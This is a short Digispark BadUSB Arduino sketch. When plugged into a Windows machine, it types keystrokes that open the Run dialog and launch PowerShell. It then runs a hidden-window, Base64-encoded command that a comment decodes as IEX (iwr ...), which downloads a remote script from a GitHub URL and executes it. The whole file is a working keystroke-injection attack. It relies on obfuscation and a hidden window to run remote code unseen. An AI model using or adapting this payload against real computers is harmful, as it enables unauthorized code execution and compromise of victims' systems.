#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(2000); # Delay to init
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); # Open run window
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(2000); # Delay after Powershell is launched
  # Executes the Base64 encoded powershell: "IEX (iwr 'https://raw.githubusercontent.com/helfiesp/Security/main/BadUSB/download.ps1')"
  DigiKeyboard.println("powershell /w h /e "SQBFAFgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGgAZQBsAGYAaQBlAHMAcAAvAFMAZQBjAHUAcgBpAHQAeQAvAG0AYQBpAG4ALwBCAGEAZABVAFMAQgAvAGQAbwB3AG4AbABvAGEAZAAuAHAAcwAxACcAKQA\");
}
void loop() {
    # No data in the loop
}   
